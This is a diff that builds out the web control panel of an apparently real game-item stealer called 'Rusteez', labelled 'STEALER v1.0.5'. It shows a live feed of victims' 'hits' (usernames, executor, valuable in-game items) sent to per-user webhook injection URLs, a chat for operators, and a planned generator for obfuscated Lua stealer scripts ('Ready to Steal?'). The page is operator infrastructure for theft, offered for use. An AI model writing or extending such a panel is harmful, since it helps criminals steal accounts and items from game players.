@@ -1,46 +1,179 @@
-<body style="display:block; margin:0;">
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Rusteez | Control Panel</title>
+</head>
+<body>
     <div class="dashboard-container">
         <div class="sidebar">
-            <h2 style="color:var(--accent); text-align:center;">RUSTEEZ</h2>
-            <hr style="width:100%; border:0.5px solid #40444b; margin: 20px 0;">
+            <h2 style="color:var(--accent); text-align:center; letter-spacing: 2px;">RUSTEEZ</h2>
+            <p style="text-align:center; font-size:0.7em; color:gray; margin-top:-10px;">STEALER v1.0.5</p>
             
-            <button class="tab-btn active" onclick="openTab(event, 'trade-hits')">💎 Trade Hits</button>
-            <button class="tab-btn" onclick="openTab(event, 'messages')">💬 Messages</button>
-            <button class="tab-btn" onclick="openTab(event, 'create-script')">📜 Create Script</button>
+            <nav style="margin-top: 30px;">
+                <button class="tab-btn active" onclick="openTab(event, 'trade-hits')">💎 Trade Hits</button>
+                <button class="tab-btn" onclick="openTab(event, 'messages')">💬 Messages</button>
+                <button class="tab-btn" onclick="openTab(event, 'create-script')">📜 Create Script</button>
+            </nav>
             
-            <div style="margin-top:auto;">
-                <p id="user-display" style="font-size:0.8em; color:gray;">User: ...</p>
-                <button onclick="logout()" style="background:#ff4747; padding:8px;">Logout</button>
+            <div style="margin-top:auto; padding:15px; background: rgba(0,0,0,0.3); border-radius:8px;">
+                <div id="user-display" style="font-weight:bold; font-size:0.9em; margin-bottom:5px;">Loading...</div>
+                <div style="font-size:0.75em; color:var(--success);">● Connection Stable</div>
+                <button onclick="logout()" style="margin-top:10px; background:var(--danger); border:none; color:white; width:100%; padding:6px; border-radius:4px; cursor:pointer; font-size:0.8em;">Logout</button>
             </div>
         </div>
 
         <div class="main-content">
             
             <div id="trade-hits" class="tab-content active">
-                <h1>Trade Hits Feed</h1>
-                <div id="hits-container" class="hits-list">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <h1>Live Feed</h1>
+                    <div style="text-align:right;">
+                        <span style="color:var(--text-muted); font-size:0.8em;">Injection URL:</span><br>
+                        <code id="webhook-url" style="color:var(--success); font-size:0.9em;">---</code>
                     </div>
+                </div>
+                <div id="hits-container" class="hits-list">
+                    <p style="color:gray; text-align:center; margin-top:50px;">Awaiting incoming trade machine data...</p>
+                </div>
             </div>
 
             <div id="messages" class="tab-content">
-                <h1>User & Admin Messages</h1>
-                <div class="chat-system">
+                <h1>Communications</h1>
+                <div class="chat-container">
                     <div id="message-list"></div>
-                    <div class="message-input">
-                        <input type="text" id="msg-target" placeholder="User ID or 'Admin'">
-                        <input type="text" id="msg-content" placeholder="Type a message...">
-                        <button onclick="sendMessage()">Send</button>
+                    <div class="msg-input-area">
+                        <input type="text" id="msg-target" placeholder="Recipient ID or 'Admin'" style="width:180px; flex:none;">
+                        <input type="text" id="msg-content" placeholder="Type your message here...">
+                        <button class="send-btn" onclick="sendUserMessage()">SEND</button>
                     </div>
                 </div>
             </div>
 
             <div id="create-script" class="tab-content">
                 <h1>Script Generator</h1>
-                <p style="color:gray;">Coming soon... This area will be for your custom Lua scripts.</p>
+                <div style="background:var(--bg-card); padding:30px; border-radius:10px; border:1px dashed #555;">
+                    <h3 style="color:var(--accent);">Ready to Steal?</h3>
+                    <p>This module is being updated to support the latest Brainrot Trade Machine obfuscation.</p>
+                    <button disabled style="background:#555; cursor:not-allowed;">GENERATE OBFUSCATED LUA</button>
+                </div>
             </div>
 
         </div>
     </div>
 
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let currentUser = null;
+
+        // --- AUTH & INITIALISATION ---
+        async function init() {
+            try {
+                const res = await fetch('/api/user/me');
+                if (!res.ok) throw new Error();
+                currentUser = await res.json();
+                
+                document.getElementById('user-display').innerText = currentUser.username;
+                document.getElementById('webhook-url').innerText = `${window.location.origin}/webhook/${currentUser.webhook}`;
+                
+                socket.emit('join_room', currentUser.id);
+                loadMessages();
+            } catch (e) {
+                window.location.href = '/login';
+            }
+        }
+
+        // --- GESTION DES ONGLETS ---
+        function openTab(evt, tabName) {
+            const contents = document.getElementsByClassName("tab-content");
+            for (let c of contents) c.classList.remove("active");
+            const buttons = document.getElementsByClassName("tab-btn");
+            for (let b of buttons) b.classList.remove("active");
+            
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+
+        // --- LOGIQUE DES HITS (WEBHOOKS) ---
+        socket.on('receive_message', (data) => {
+            const container = document.getElementById('hits-container');
+            if (container.innerHTML.includes("Awaiting")) container.innerHTML = "";
+
+            const now = new Date().toLocaleTimeString();
+            const card = document.createElement('div');
+            card.className = 'hit-card';
+            card.innerHTML = `
+                <div class="hit-header">MozilOnTop • SAB Hit [ 🌊 ] <span style="margin-left:auto; font-size:0.7em; color:gray;">${now}</span></div>
+                <div class="hit-title">👤 Player Information</div>
+                <div class="hit-section">
+                    <div class="hit-data">
+                        Display Name : ${data.displayName || 'Unknown'}<br>
+                        Username     : ${data.username || 'N/A'}<br>
+                        Executor     : ${data.executor || 'Generic'}
+                    </div>
+                </div>
+                <div class="hit-title">👑 Valuable Brainrots</div>
+                <div class="hit-section">
+                    <div class="hit-data" style="color:#00ff00;">${data.text || 'No high value items found.'}</div>
+                </div>
+            `;
+            container.prepend(card);
+        });
+
+        // --- LOGIQUE DES MESSAGES ---
+        async function loadMessages() {
+            const res = await fetch('/api/messages');
+            const messages = await res.json();
+            const list = document.getElementById('message-list');
+            list.innerHTML = "";
+            messages.forEach(displayMessage);
+        }
+
+        function displayMessage(msg) {
+            const list = document.getElementById('message-list');
+            const isMe = msg.sender === currentUser.id;
+            const div = document.createElement('div');
+            div.className = 'message-entry';
+            div.style.borderLeft = `3px solid ${isMe ? 'var(--accent)' : '#7289da'}`;
+            div.innerHTML = `
+                <div style="display:flex; justify-content:space-between; font-size:0.75em; color:gray;">
+                    <span>${msg.senderName}</span>
+                    <span>${new Date(msg.timestamp).toLocaleTimeString()}</span>
+                </div>
+                <div style="margin-top:5px; color:white;">${msg.content}</div>
+            `;
+            list.appendChild(div);
+            list.scrollTop = list.scrollHeight;
+        }
+
+        async function sendUserMessage() {
+            const target = document.getElementById('msg-target').value || 'Admin';
+            const content = document.getElementById('msg-content').value;
+            if(!content) return;
+
+            const res = await fetch('/api/messages/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ recipient: target, content: content })
+            });
+
+            if(res.ok) {
+                document.getElementById('msg-content').value = "";
+                // Le message apparaîtra via Socket.io automatiquement
+            }
+        }
+
+        socket.on('new_direct_message', displayMessage);
+
+        function logout() {
+            document.cookie = "auth_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+            window.location.href = "/login";
+        }
+
+        init();
+    </script>
 </body>
 </html>
